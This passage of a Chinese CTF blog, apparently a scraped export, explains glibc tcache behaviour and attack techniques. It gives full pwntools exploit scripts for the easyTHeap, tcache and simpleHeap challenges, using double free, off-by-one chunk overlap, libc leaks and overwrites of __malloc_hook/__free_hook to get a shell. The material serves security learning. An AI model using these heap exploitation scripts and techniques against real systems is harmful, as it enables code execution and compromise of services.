Tcachebin未满时，却从Fastbin/Smallbin中取出堆块，则会将链上的其他堆块都链入Tcachebin中。其具体算法是首先将Fastbin/Smallbin中取出的堆块指针进行保存，并判断该大小对应的Tcachebin是否未满，若未满则将其之后的堆块按照Fastbin/Smallbin的分配顺序将堆块链入Tcachebin中，直到对应大小的Tcachebin放满或Fastbin/Smallbin的链为空，最后将之前取出的堆块指针返回给用户使用。由于是按照Fastbin/Smallbin的分配顺序将堆块放入Tcachebin中，因此不难判断，最从Tcachebin中申请的堆块顺序是与正常从Fastbin/Smallbin中申请堆块顺序时反向的。 文字看不懂（我也没看懂 orz）？没关系，上代码。 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); return 0; } 没错，申请了十个相同大小的chunk，然后全部free掉，其中c开头的是放到tcache bins中的，f开头的是tcache满了然后被放到了fastbins里面中去。 看一下内存分布 然后我们改一下源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); void *t1,*t2,*t3,*t4,*t5,*t6,*t7; void *a1,*a2,*a3; t1 = malloc(0x10); t2 = malloc(0x10); t3 = malloc(0x10); t4 = malloc(0x10); t5 = malloc(0x10); t6 = malloc(0x10); t7 = malloc(0x10); a1 = malloc(0x10); return 0; } 思路就是我们将tcachebin填满，然后free3次同样大小的chunk，发现进入到fastbin里面，然后我们通过malloc将tcachebin全部清空，如下图 可以看到此时tcachebin已经空了 fastbin里面是这样的 然后再malloc一次，发现fastbin被清空，剩余的两个bin被移到tcachebin里面去 本来是350指向330 移入到tcache后变成了340(0x350 - 0x10)指向了360 证明了前文的结论，“因此不难判断，最从Tcachebin中申请的堆块顺序是与正常从Fastbin/Smallbin中申请堆块顺序时反向的”。 利用方法 贴个大佬总结的，我仔细看了看这几个方法的说明，本题目应该用了以下前三个漏洞，其实叫啥名不重要，会用就行~ Tcache poisoning（tcache 投毒） 在上一部分中也提到过这种方法。与Fastbin Attack类似，篡改Tcachebin中的fd字段，导致在申请被篡改堆块后的下一个堆块时能够申请到任意地址。与Fastbin相比，Tcachebin中为了得到更高的效率而舍去了安全性，在进行申请时没有对size位进行校验，而且由于Tcachebin中的fd是指向下一个堆块的fd(Fastbin的fd是指向下一个堆块的堆头)，因此指向的地址即是申请后写数据的地址，不再需要去考虑堆头的偏移。 Tcache dup（？？？） 这是Tcache机制刚推出的几个版本中，在进行free操作时没有对这个堆块进行一个安全检测而导致可以对同一个堆块进行多次free，那么就会变成一个Tcachebin链上链了两个相同的堆块(我指向我自己)，后面也就不用多说了。但值得一提的是在libc-2.29版本中加入了检查机制(源码的4201-4216行)，会在堆块进行free时检查这个堆块是否已经存在于这条链上，如果存在则会报&quot;free():double free detected in tcache 2&quot;的错误，因此这种直接double free利用方式存在于libc-2.26至libc-2.28的版本中。 Tcache perthread corruption （结构体污染） 在最开始介绍结构体时提到的tcache_perthread_struct结构体，该结构体size为0x250，是管理整个Tcachebin的结构体，如果对这个结构体有写权限，那么可以控制任意大小Tcachebin的入口地址。 U2T（翻译君死了） U2T即Unsortbin 2 Tcachebin，这种叫法是在一篇文章中看到的，也只看到过一次，主要是配合Off By One或Off By NULL的漏洞，使Unsortbin在合并过程中将中间的Tcachebin合并，从而达到修改fd字段的效果。 题目 [V&amp;N2020 公开赛]easyTHeap 逆向 稍微逆一下就发现了delete的时候存在UAF漏洞 不过必须要注意的是，我们只能malloc 7次，free 3次 pwn it !!! 这道题保护全开，所以我们可以攻击__malloc_hook 思路： 1，攻击__malloc_hook，必须要伪造chunk，我们可以利用tcache的特点，利用结构体污染，将tcache_perthread_struct的指针域改为__malloc_hook附近 2，污染结构体，必须要能分配到结构体上，我们可选择double free，但是前提必须要知道结构体的地址，我们可以利用show来泄漏地址，malloc(size),free(),free()，这样该chunk就记录了自己的地址，减去0x250就是结构体的地址 3，打one_gadget，必须要知道libc基地址，我们利用free态的结构体堆块（0x250会进入unsorted bin），泄漏main_arena上方的__malloc_hook拿到基地址 一种方法 唔……，本地只有2.28版本的libc，所以本地不可能打通，简单写了一下，然后one_gadget和最后realloc调栈桢的时候都是抄的别的师傅的偏移orz exp: from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',26169) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;================ step1:逃逸tcache ==============&quot;) print(&quot;-------- 利用double free，将fd ptr 写到 tcache处 -------&quot;) add(0x50) #0 free(0) free(0) add(0x50) #1 show(1) leak_tcache = u64(p.recv(6) + b'\\00\\00') - 0x250 print(&quot;tcache is in :&quot; + hex(leak_tcache)) edit(1,p64(leak_tcache)) print('----- 改写tcahche结构体中堆块的数量，使以后的chunk可以不进入tcache -----') add(0x50) #2 add(0x50) #3 this is tcache_perthread_struct 但是这里的size仍然是0x251 edit(3,b'a' * 0x30) print('================= step2:泄漏libc ==============') print('----- 利用3号堆块（tcache结构体堆块），释放后进入unsorted bin中，泄漏libc -----') free(3) show(3) leak_libc = u64(p.recv(6) + b'\\00\\00') - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc: 2.27 leak the address is 'main_arena + 96' print('the libcbase is :'+hex(leak_libc)) print('----- 获得一些函数和one gadget的地址 ------') #one_gadget = [0x41982,0x419d6,0xdf882] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = leak_libc + one_gadget_list[1] malloc_hook = leak_libc + libc.symbols['__malloc_hook'] realloc_hook = leak_libc + libc.symbols['realloc'] print(&quot;================== step3: 攻击 __malloc_hook ============&quot;) add(0x50) #4 edit(4, p64(0) * 9 + p64(malloc_hook - 0x13)) add(0x20) # fake chunk paylaod = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook + 8) edit(5, paylaod) add(0x20) p.interactive() 另一种方法 （似乎还有别的方法，我再想想还能不能用别的方法做出来（逃 ） 好像又找到了一种构造方式，本质思路没有变，细节稍微改动了一下，比如泄漏libc换成了0号chunk（哈哈哈 from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',27567) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;============ step 1: 逃逸tcache bin ===========&quot;) add(0x100) #0 add(0x10) #1 protect 0 free(0) free(0) show(0) tcache_perthread_struct = u64(p.recv(6).ljust(8,b'\\00')) - 0x250 add(0x100) #2 (0) edit(2,p64(tcache_perthread_struct)) add(0x100) #3 add(0x100) #4 tcache_perthread_struct payload = b'\\07' * 0x40 edit(4,payload) print(&quot;=========== step 2: 泄漏libc ============&quot;) free(0) show(0) libc_base = u64(p.recv(6).ljust(8,b'\\00')) - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc_base = u64(p.recv(6).ljust(8,b'\\x00'))-(0x7f5c5654cca0-0x7f5c56182ab0) print('libc base:' + hex(libc_base)) __malloc_hook = libc_base + libc.symbols['__malloc_hook'] __libc_realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] print(&quot;=========== step 3: one_gadget ===========&quot;) payload = b'\\00' * 0x40 + p64(0) * 2 + p64(__malloc_hook-0x20) edit(4,payload) add(0x30) #5 payload_one_gadget = b'A' * (0x15 - 0x8) + b'B' * (0x13 - 0x8) + p64(one_gadget) + p64(__libc_realloc + 8) edit(5,payload_one_gadget) add(0x20) #触发one_gadget p.interactive() tcache 逆向 main函数 add函数，可以看到我们可以创建20个chunk，并且我们不能控制size，malloc的默认size是0x30 show函数 delete函数 edit函数，可以很轻易的发现漏洞点位于edit，我们能够编辑0x40大小的chunk，可以溢出到下一个chunk的size域 思路：由于程序保护全开，我们必须要泄漏地址，考虑到我们能够申请较大数量的chunk，所以我们可以构造出一个较大size的unsorted bin绕过tcache bin，用来泄漏地址。但是我们必须得通过相关检查，后一个chunk必须完整，这一点经过调试可以构造出相关合理的size（通过溢出0x10字节） 泄漏完地址之后，我们可以打__free_hook，我们虽然没有UAF漏洞，但是我们可以利用unsorted bin构成一个类似于UAF的漏洞。因为我们之前构造出一个unsorted bin，在free之前记为1号chunk，我们可以malloc()一个块，这时这个块的id就为1，再malloc一个块，记为x，因为x在之前已经有指针了，记为x1，我们再次申请，就会从unsorted bin中给我们切下来一块，这个新指针记为x2，这样x1，x2都指向了同一个块，达成了一个“UAF”，我们free掉x1，编辑x2，就可以攻击成功。 exp exp: from pwn import * local = 1 if local == 1: p = process('./tcache') else: p = remote('chall.pwnable.tw',10304) #elf = ELF('./bookwriter') libc = ELF('/glibc/2.28/64/lib/libc.so.6') def dbg(): context.log_level = 'debug' def add(content): p.sendlineafter('4. Show String','1') p.sendafter('Input your content:',content) def show(index): p.sendlineafter('4. Show String','4') p.sendafter('Select string:',str(index)) def edit(index,content): p.sendlineafter('4. Show String','2') p.sendafter('Select string:',str(index)) p.sendafter('Input your content:',content) def delete(index): p.sendlineafter('4. Show String','3') p.sendafter('Select string:',str(index)) for i in range(19): add('A') payload = p64(0) * 7 + p64(0x441) edit(0,payload) delete(1) payload1 = 0x40 * b'A' edit(0,payload1) show(0) p.recvuntil(b'A' * 64) libc_base = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 96 - 0x10 - libc.sym['__malloc_hook'] print(&quot;[*] libc_base --&gt; &quot;,hex(libc_base)) __free_hook = libc_base + libc.sym['__free_hook'] print(&quot;[*] __free_hook ---&gt; &quot;,hex(__free_hook)) system_addr = libc_base + libc.sym['system'] edit(0,payload) add('/bin/sh;') #chunk1 add('AAAAAAAA') #chunk19 == chunk2 delete(4) delete(2) edit(19,p64(__free_hook)) add(p64(system_addr)) add(p64(system_addr)) delete(1) p.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/"},{"title":"[V&N2020 公开赛]simpleHeap","content":"通过这个题目来学习 off-by-one 什么是off by one(null) ? 定义我也不知道，直接说我的理解。就是那种在用户输入时，一个循环处理边界问题或者是数组越界，对我们的输入没有很好的处理，就会导致一个字节的溢出（或者是strcpy处理不当）。 利用off-by-one 有师傅喜欢叫off-by-one 为一个字节的偷渡攻击 给攻击者发挥的攻击空间也只有一个字节，所以利用方式还是有一定限制的 我们最常利用的（或许是）手法是 堆块重叠（chunk extend），跟我之前讲过的“堆块怀孕”本质是一个东西，chunk extend 的利用条件如下： 1，能够进行堆空间的布局（即写入之类的功能） 2，至少能够溢出一个字节 其中第二个条件正好符合off-by-one的情景 利用过程：off-by-one + chunk extend 由于本人水平有限（wtcl orz 所以就举两个例子好了，一个是开启了Full RELRO，一个没开启 got表无防护的利用情景 既然got表无防护，那么我们可以利用这一个字节的溢出来改写got表，看详细的c代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main() { void *p,*q1,*r1,*q2,*r2,*got; p = malloc(0x18); //index 0 q1 = malloc(0x20); //index 1 r1 = malloc(0x30); //index 2 memset(p+0x18,0x71,0x1); free(q1); free(r1); q2 = malloc(0x60); memset(q2+0x30,'A',0x8); r2 = malloc(0x30); got = malloc(0x30); return 0; } 思路是申请三个chunk，大小分别为0x18,0x20,0x30 第一个chunk用来出发off-by-one 漏洞，第二个chunk用来构筑堆块重叠，第三个chunk用来构筑 fake chunk，我们利用第一个chunk溢出一字节来改写第二个chunk的size位，然后将第三个chunk来包含进去，然后free两次，在malloc一次，拿到big chunk的控制权，通过向big chunk里写入内容，改写free small chunk的fd pointer(此时smaller chunk还是free态)，接着malloc两次，我们就能够拿到一个fake chunk，如果fake chunk位于got表附近，那么我们便可以劫持got表项继而拿到shell 接下来我们看具体的调试过程。 malloc拿到三个堆块： 人为构造一个off-by-one来溢出一字节： free两次，可以看到我们改写后的chunk已经变成了free态： 通过向big chunk里写内容可以改写fd pointer，可以看到2号chunk的pointer已经变成了‘AAAA’…… 这个便是劫持got表的流程 got 表不可写： 对于got表项不可写的elf，我们可以借鉴fastbin attack的思路来攻击__malloc_hook函数，将__malloc_hook函数改写成one_gadget，触发malloc拿shell 思路很简单，大体思路和上面一样，然后三号chunk的fd pointer可以写成__malloc_hook+23的位置（字节错位，具体原因不再赘述），然后将__malloc_hook改写即可，注意的是，为了达到fastbin attack的目的，我们3号块的mem大小必须是0x60，因为要把0x7f的fake chunk链接在同一个bin中 题目解析： 逆向过程： 代码量尚可，off-by-one的漏洞还是有一定隐秘性的，具体的逆向分析不再赘述 注意两个点即可： 第一，本程序不存在UAF漏洞，即delete函数中对free的chunk处理的很好，把free态的指针数据都给清空了 第二，就是off-by-one的产生的位置 可以看到，if判断语句是小于号，也就是说当变量等于size+1的时候依然可以可以读入数据，这就是典型的off-by-one漏洞 pwn it ！！！ 思路分析 这个程序保护全开，所以我们不能攻击got表了，我们只能选择__malloc_hook函数，但是我们要想找到__malloc_hook函数，我们必须泄漏libc，但是程序只允许我们申请fastbin大小的chunk 这个题有一个很巧妙的泄漏libc的方法，就是将两个fastbin合并成一个unsortedbin，利用unsorted bin来泄漏main_arena + 88的位置，然后拿到libc基址。 具体思路是这样的，构造四个chunk： chunk 0 : size 0x18 chunk 1 : size 0x50 chunk 2 : size 0x60 chunk 3 : size 0x10 （防止与top chunk合并） 我们通过off-by-one将1和2合并，free 1，这个时候1和2合并的chunk已经超过fastbin，进入unsorted bin，我们再malloc(0x50)，这个时候unsorted bin就会切割下来0x50，剩下2号chunk留在unsorted bin里面，但是！！我们从始至终都没有free chunk 2，2号指针的控制权仍然在我们手中，所以我们可以打印2号chunk的内容，为什么呢？因为2号chunk在unsorted bin里，其fd 和 bk都是有内容的！！他们都指向了main_arena + 88，通过这一点，我们就能泄漏出libc的基地址 我们拿到基址后，就得想办法fastbin attack，有一种办法就是我们上文说的方法，构造三个fastbin chunk，自然是可以的，但是如果题目限制我们malloc次数，我们还有办法吗？（这个题目虽然限制次数，但是依然申请三次依然在允许的范围之内） 答案是有的，我们可以malloc(0x60)，记成chunk 4，然后我们紧接着free 4，这么做的目的就是将这块chunk从unsorted bin中移动到 fastbin中，so 我们再次利用 allocated 态的2号pointer来edit，把fd位改成__malloc_hook - 0x23，然后one_gadget 但是这个题目在gadget的时候我们发现是有问题的，因为四个gadget的寄存器的条件我们均不满足，所以我们得借助__libc_realloc函数来调整寄存器的值，在__libc_realloc函数中会调用__realloc_hook函数，所以我们把one_gadget的位置打到__realloc_hook的位置，把__libc_realloc的地址打到__malloc_hook里面即可，令人兴奋的是，__realloc_hook的位置就在__malloc_hook的上方，这样我们的程序执行流程为，我们malloc---&gt;触发__malloc_hook---&gt;跳转到__libc_realloc调整寄存器---&gt;触发__realloc_hook---&gt;__realloc_hook是我们的one_gadget---&gt;get shell !!! __malloc_hook = fake_chunk_mem - 0x13 __realloc_hook = fake_chunk_mem - 0x13 - 0x5 漏洞利用 exp:（pwntools版本是python3的版本） from pwn import * local = 0 if local == 1: sh = process('./vn_pwn_simpleHeap') else: sh = remote('node3.buuoj.cn',28903) libc = ELF('./libc-2.23.so') elf = ELF('./vn_pwn_simpleHeap') def add(size,content): sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('size?',str(size)) sh.sendafter('content:',content) def edit(index,content): sh.sendlineafter('choice: ','2') sh.sendlineafter('idx?',str(index)) sh.sendafter('content',content) def show(index): sh.sendlineafter('choice: ','3') sh.sendlineafter('idx?',str(index)) def delete(index): sh.sendlineafter('choice: ','4') sh.sendlineafter('idx?',index) print(&quot;============================== 1: by using off-by-one we can do a overlapping chunk ===================== &quot;) add(0x18,b'A'*0x18) #index 0 0x18 because we use the next chunk prevsize double using add(0x50,b'A') #index 1 add(0x60,b'A') #index 2 add(0x10,b'A') #index 3 to protect edit(0,b'A' * 0x18 + b'\\xd1') # off by one to change the &quot;index 1&quot; chunk's size print(&quot;============================ 2: leak libc by unsortedbin ==================================== &quot;) delete('1') add(0x50,'B') show(2) #index 2 memorize the unsorted bin's fd pointer and bk pointer but we don't free index 2 main_arena_88 = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) main_arena = main_arena_88 - 88 libc_base = (main_arena - 0x10) - libc.symbols['__malloc_hook'] #libc_base = __malloc_hook - __malloc_hook_offset print(hex(libc_base)) print(&quot;================================ 3: fastbin attack ---&gt; attack __malloc_hook-0x23 ================&quot;) malloc_hook = libc_base + libc.symbols['__malloc_hook'] fake_chunk = malloc_hook - 0x23 print('the next,we use 2 pointers to point a same chunk!!!!!!!!!!!!!!!!!!!!!!!!!!') add(0x60,b'A' * 16) #index 4 delete('2') print('########################## actually , the free pointer &quot;index 2&quot; and the allocated pointer &quot;index 4&quot; point a same chunk ################') print(&quot;######### we use the allocated pointer to write 'fd pointer' #############&quot;) edit(4,p64(fake_chunk)+b'\\n') one_gadget = libc_base + 0x4526a #one_gadget print(&quot;################# by gdb ,we find that we can't one_gadget.So we must change the stack(rsp) by __libc_realloc ################&quot;) realloc_hook = libc_base + libc.symbols['__libc_realloc'] + 12 realloc_hook_1 = libc_base + 0x846CC print(&quot;we change the '__malloc_hook' '__libc_realloc'(it will be call realloc_hook!!!) , 'realloc_hook' change to one_gadget !!!!&quot;) print(&quot;'realloc_hook' in '__malloc_hook'-0x8 !!!!!!!! &quot;) payload = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook) + b'\\n' add(0x60,'A') #index 2 which fd pointer point fake chunk add(0x60,payload) #index fake chunk print(&quot;============================== 4: one_gadget ===========================&quot;) sh.sendline('1') sh.sendline('32') sh.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/"}]}